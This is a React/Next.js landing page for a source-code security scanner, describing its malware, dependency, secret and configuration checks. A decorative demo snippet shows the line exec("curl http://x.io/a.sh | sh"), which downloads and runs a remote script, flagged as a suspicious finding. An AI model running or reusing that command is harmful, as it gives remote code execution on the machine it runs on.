"use client";

import {
  Bug,
  Check,
  FileCode,
  GitBranch,
  GitPullRequest,
  KeyRound,
  Package,
  Puzzle,
  ScanSearch,
  ShieldAlert,
  Settings2,
  Upload,
} from "lucide-react";
import Link from "next/link";
import { useEffect, useState } from "react";
import { useMeta } from "@/components/meta";
import { Plans } from "@/components/plans";
import { ShieldLogo } from "@/components/primitives";
import { ThemeToggle } from "@/components/theme";
import { buttonClass } from "@/components/ui";
import { api } from "@/lib/api";

const SCANS = [
  {
    icon: ShieldAlert,
    title: "Malware indicators",
    body: "Obfuscation, remote code execution, credential theft, exfiltration and backdoor patterns — reported as indicators for review, with evidence.",
  },
  {
    icon: Package,
    title: "Vulnerable dependencies",
    body: "Manifests and lockfiles matched against the OSV database. Advisory IDs, affected ranges and published fixed versions only.",
  },
  {
    icon: KeyRound,
    title: "Exposed secrets",
    body: "Provider-specific formats and high-entropy strings. Evidence is always masked — full secret values are never stored or shown.",
  },
  {
    icon: Settings2,
    title: "Configuration risks",
    body: "Risky install scripts, CI configuration, exposed files and insecure settings that widen your attack surface.",
  },
  {
    icon: GitBranch,
    title: "Git history",
    body: "Commit-by-commit signals: dependency and install-script changes, new URLs, executables and config changes.",
  },
  {
    icon: GitPullRequest,
    title: "Pull requests",
    body: "Only what a change introduces relative to its target branch, with links to the exact lines in the diff.",
  },
];

const STEPS = [
  {
    icon: Upload,
    title: "Bring your code",
    body: "Upload files, a folder or an archive; paste a GitHub, GitLab, Bitbucket, Dropbox or Google Drive link; or connect a repository.",
  },
  {
    icon: ScanSearch,
    title: "Isolated scanning",
    body: "Workers fetch the source, build an inventory and run rule, secret, dependency and history engines — then score the results.",
  },
  {
    icon: FileCode,
    title: "Explainable report",
    body: "Findings classified as Confirmed, Suspicious or Possible false positive, with coverage and limitations listed alongside.",
  },
  {
    icon: Puzzle,
    title: "Chrome extension",
    body: "Scan the repository, file or pull request you are viewing on GitHub, GitLab or Bitbucket with one click, and open the full report here.",
  },
];

const HERO_CODE: [string, boolean][] = [
  ['const fs = require("fs");', false],
  ['const { exec } = require("child_process");', false],
  ['exec("curl http://x.io/a.sh | sh");', true],
  ['const key = "AKIA••••••••••••";', false],
  ["module.exports = run;", false],
];

const TRANSPARENCY_NOTES = [
  {
    title: "What it finds",
    text: "Known CVEs, exposed secrets, risky install scripts, and malicious indicator patterns with evidence.",
  },
  {
    title: "Known limitations",
    text: "Novel zero-days or deep obfuscation can be missed. Some matches require human triage.",
  },
  {
    title: "Explainable score",
    text: "Risk score is additive and explainable — not a safety guarantee. Treat results as input to review.",
  },
];

export default function LandingPage() {
  const { productName } = useMeta();
  const [signedIn, setSignedIn] = useState(false);

  useEffect(() => {
    api.auth
      .me({ skipAuthRedirect: true })
      .then(() => setSignedIn(true))
      .catch(() => setSignedIn(false));
  }, []);

  return (
    <div className="landing-page min-h-screen">
      <header className="sticky top-0 z-20 border-b border-slate-200/70 bg-white/80 backdrop-blur dark:border-ink-600/70 dark:bg-ink-900/80">
        <div className="mx-auto flex h-16 max-w-6xl items-center justify-between px-4 sm:px-6">
          <Link
            href="/"
            className="flex items-center gap-2 rounded-lg focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-brand-500"
          >
            <ShieldLogo size={28} />
            <span className="font-semibold tracking-tight">{productName}</span>
          </Link>
          <nav
            aria-label="Primary"
            className="flex items-center gap-1 sm:gap-2"
          >
            <a
              href="#scans"
              className="hidden px-3 py-2 text-sm text-slate-600 hover:text-slate-900 dark:text-slate-300 dark:hover:text-white sm:inline"
            >
              What we scan
            </a>
            <a
              href="#plans"
              className="hidden px-3 py-2 text-sm text-slate-600 hover:text-slate-900 dark:text-slate-300 dark:hover:text-white sm:inline"
            >
              Plans
            </a>
            <ThemeToggle />
            {signedIn ? (
              <Link href="/dashboard" className={buttonClass("primary", "sm")}>
                Open dashboard
              </Link>
            ) : (
              <>
                <Link href="/login" className={buttonClass("ghost", "sm")}>
                  Sign in
                </Link>
                <Link href="/register" className={buttonClass("primary", "sm")}>
                  Get started
                </Link>
              </>
            )}
          </nav>
        </div>
      </header>

      <main id="main">
        <section className="relative overflow-hidden">
          <div
            className="pointer-events-none absolute inset-0 bg-[radial-gradient(ellipse_at_top,rgba(37,99,235,0.18),transparent_60%)]"
            aria-hidden="true"
          />
          <div className="relative mx-auto max-w-6xl px-4 pb-20 pt-20 sm:px-6 sm:pt-28 lg:grid lg:grid-cols-[1fr_24rem] lg:items-center lg:gap-12">
            <div>
              <p className="inline-flex items-center gap-2 rounded-full border border-brand-500/30 bg-brand-500/10 px-3 py-1 text-xs font-medium text-brand-700 dark:text-brand-400">
                <Bug size={14} aria-hidden="true" /> Source code security
                scanning
              </p>
              <h1 className="mt-6 max-w-3xl text-4xl font-semibold tracking-tight sm:text-5xl">
                Know what is in the code before you run it.
              </h1>
              <p className="mt-5 max-w-2xl text-lg text-slate-600 dark:text-slate-300">
                {productName} inspects uploads, repositories, branches and pull
                requests for malware indicators, vulnerable dependencies,
                exposed secrets and risky configuration — and explains every
                finding with evidence, coverage and limitations.
              </p>
              <div className="mt-8 flex flex-wrap gap-3">
                <Link
                  href={signedIn ? "/scans/new" : "/register"}
                  className={buttonClass(
                    "primary",
                    "lg",
                    "landing-control hover:shadow-md hover:shadow-brand-500/20 active:brightness-95",
                  )}
                >
                  {signedIn ? "Start a scan" : "Create a free account"}
                </Link>
                <a
                  href="#how"
                  className={buttonClass(
                    "outline",
                    "lg",
                    "landing-control hover:border-slate-400 hover:shadow-sm active:brightness-95 dark:hover:border-ink-500",
                  )}
                >
                  How it works
                </a>
              </div>
            </div>
            <div
              aria-hidden="true"
              className="relative mt-12 hidden overflow-hidden rounded-2xl border border-slate-200 bg-white shadow-xl shadow-brand-500/10 dark:border-ink-600 dark:bg-ink-800 lg:mt-0 lg:block"
            >
              <div className="flex items-center gap-2 border-b border-slate-200 px-4 py-3 dark:border-ink-600">
                <FileCode size={14} className="text-slate-400" />
                <span className="font-mono text-xs text-slate-500 dark:text-slate-400">
                  package/install.js
                </span>
                <span className="ml-auto inline-flex items-center gap-1.5 text-[11px] font-medium text-brand-600 dark:text-brand-400">
                  <span className="hero-pulse h-1.5 w-1.5 rounded-full bg-brand-500" />{" "}
                  Scanning
                </span>
              </div>
              <div className="relative space-y-1.5 overflow-hidden px-4 py-4 font-mono text-xs">
                {HERO_CODE.map(([line, flagged]) => (
                  <div
                    key={line}
                    className={
                      flagged
                        ? "rounded bg-red-500/10 px-2 py-0.5 text-red-600 ring-1 ring-inset ring-red-500/30 dark:text-red-400"
                        : "px-2 py-0.5 text-slate-500 dark:text-slate-400"
                    }
                  >
                    {line}
                  </div>
                ))}
                <div className="hero-scan-line pointer-events-none absolute inset-0 border-b border-brand-400 bg-gradient-to-b from-transparent to-brand-500/20 shadow-[0_6px_16px_-2px_rgba(59,130,246,0.55)]" />
              </div>
              <div className="flex gap-1.5 whitespace-nowrap border-t border-slate-200 px-3 py-3 text-[11px] dark:border-ink-600">
                <span className="inline-flex items-center gap-1.5 rounded-full bg-red-500/10 px-2 py-1 font-medium text-red-600 dark:text-red-400">
                  <ShieldAlert size={12} /> Suspicious
                </span>
                <span className="inline-flex items-center gap-1.5 rounded-full bg-amber-500/10 px-2 py-1 font-medium text-amber-600 dark:text-amber-400">
                  <KeyRound size={12} /> Secret masked
                </span>
                <span className="inline-flex items-center gap-1.5 rounded-full bg-emerald-500/10 px-2 py-1 font-medium text-emerald-600 dark:text-emerald-400">
                  <Check size={12} /> 41 clean
                </span>
              </div>
            </div>
          </div>
        </section>

        <section
          id="scans"
          className="mx-auto scroll-mt-8 max-w-6xl px-4 py-16 sm:px-6"
          aria-labelledby="scans-title"
        >
          <h2
            id="scans-title"
            className="text-2xl font-semibold tracking-tight"
          >
            What it scans for
          </h2>
          <div className="mt-8 grid gap-5 sm:grid-cols-2 lg:grid-cols-3">
            {SCANS.map(({ icon: Icon, title, body }) => (
              <div
                key={title}
                className="landing-surface group rounded-2xl border border-slate-200 bg-white p-6 hover:border-brand-500/40 hover:shadow-lg hover:shadow-brand-500/5 dark:border-ink-600 dark:bg-ink-800 dark:hover:border-brand-400/40 dark:hover:shadow-brand-500/10"
              >
                <div className="landing-control flex h-10 w-10 items-center justify-center rounded-xl bg-brand-50 text-brand-600 group-hover:bg-brand-600 group-hover:text-white dark:bg-brand-500/10 dark:text-brand-400 dark:group-hover:bg-brand-500 dark:group-hover:text-white">
                  <Icon size={20} aria-hidden="true" />
                </div>
                <h3 className="mt-4 font-semibold transition-colors duration-200 group-hover:text-brand-600 dark:group-hover:text-brand-400">
                  {title}
                </h3>
                <p className="mt-2 text-sm leading-relaxed text-slate-600 dark:text-slate-400">
                  {body}
                </p>
              </div>
            ))}
          </div>
        </section>

        <section
          id="how"
          className="scroll-mt-8 border-y border-slate-200 bg-white py-16 dark:border-ink-600 dark:bg-ink-800/40"
          aria-labelledby="how-title"
        >
          <div className="mx-auto max-w-6xl px-4 sm:px-6">
            <h2
              id="how-title"
              className="text-2xl font-semibold tracking-tight"
            >
              How it works
            </h2>
            <ol className="mt-10 grid gap-x-6 gap-y-10 md:grid-cols-2 lg:grid-cols-4">
              {STEPS.map(({ icon: Icon, title, body }, i) => (
                <li key={title}>
                  <div className="flex items-center gap-3">
                    <span className="flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-brand-600 text-sm font-semibold text-white shadow-sm shadow-brand-600/30">
                      {i + 1}
                    </span>
                    {i < STEPS.length - 1 && (
                      <span
                        className="hidden h-px flex-1 bg-slate-200 dark:bg-ink-600 lg:-mr-6 lg:block"
                        aria-hidden="true"
                      />
                    )}
                  </div>
                  <h3 className="mt-5 flex items-center gap-2 font-semibold">
                    <Icon
                      size={18}
                      className="shrink-0 text-brand-600 dark:text-brand-400"
                      aria-hidden="true"
                    />
                    {title}
                  </h3>
                  <p className="mt-2 pr-4 text-sm leading-relaxed text-slate-600 dark:text-slate-400">
                    {body}
                  </p>
                </li>
              ))}
            </ol>
          </div>
        </section>

        <section
          className="mx-auto max-w-6xl px-4 py-16 sm:px-6"
          aria-labelledby="honest-title"
        >
          <div className="rounded-2xl border border-amber-500/30 bg-amber-500/5 p-6 sm:p-8 lg:p-10">
            <div className="grid gap-8 lg:grid-cols-12 lg:items-center">
              <div className="lg:col-span-5">
                <span className="inline-flex items-center gap-1.5 rounded-full border border-amber-500/30 bg-amber-500/10 px-3 py-1 text-xs font-medium text-amber-700 dark:text-amber-400">
                  <ShieldAlert size={14} aria-hidden="true" />
                  Transparency & Expectations
                </span>
                <h2
                  id="honest-title"
                  className="mt-3 text-xl font-semibold tracking-tight text-slate-900 dark:text-white sm:text-2xl"
                >
                  An honest note on what scanning can and cannot do
                </h2>
                <p className="mt-3 text-sm leading-relaxed text-slate-600 dark:text-slate-300">
                  No automated scanner — including {productName} — can guarantee
                  code is 100% free of risk. We believe in total transparency
                  about capabilities and limitations.
                </p>
              </div>

              <div className="grid gap-3 sm:grid-cols-3 lg:col-span-7">
                {TRANSPARENCY_NOTES.map(({ title, text }) => (
                  <div
                    key={title}
                    className="landing-surface group rounded-xl border border-amber-500/20 bg-white/70 p-4 shadow-xs hover:border-amber-500/40 hover:bg-white hover:shadow-md hover:shadow-amber-500/5 dark:border-amber-500/15 dark:bg-ink-800/80 dark:hover:bg-ink-700/90"
                  >
                    <p className="text-xs font-semibold uppercase tracking-wider text-amber-700 dark:text-amber-400">
                      {title}
                    </p>
                    <p className="mt-1.5 text-xs leading-relaxed text-slate-600 dark:text-slate-300">
                      {text}
                    </p>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </section>

        <section
          id="plans"
          className="mx-auto scroll-mt-24 max-w-6xl px-4 pb-16 sm:px-6"
          aria-labelledby="plans-title"
        >
          <h2
            id="plans-title"
            className="text-2xl font-semibold tracking-tight"
          >
            Plans
          </h2>
          <div className="mt-8">
            <Plans />
          </div>
        </section>

        <section className="mx-auto max-w-6xl px-4 pb-24 sm:px-6">
          <div className="landing-surface group flex flex-col items-start justify-between gap-6 rounded-2xl bg-brand-600 p-8 text-white hover:shadow-xl hover:shadow-brand-600/20 sm:flex-row sm:items-center">
            <div>
              <h2 className="text-xl font-semibold">
                Scan your first project in minutes
              </h2>
              <p className="mt-1 text-sm text-blue-100">
                Upload a folder or paste a repository URL. Reports are private
                to your organization.
              </p>
            </div>
            <Link
              href={signedIn ? "/scans/new" : "/register"}
              className="landing-control inline-flex h-11 items-center rounded-lg bg-white px-5 text-sm font-semibold text-brand-700 shadow-sm hover:bg-blue-50 hover:shadow-md active:brightness-95 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-white"
            >
              {signedIn ? "Start a scan" : "Get started"}
            </Link>
          </div>
        </section>
      </main>

      <footer className="border-t border-slate-200 py-8 text-center text-xs text-slate-500 dark:border-ink-600 dark:text-slate-400">
        © {new Date().getFullYear()} {productName}. Results are indicators for
        review, not guarantees.
      </footer>
    </div>
  );
}
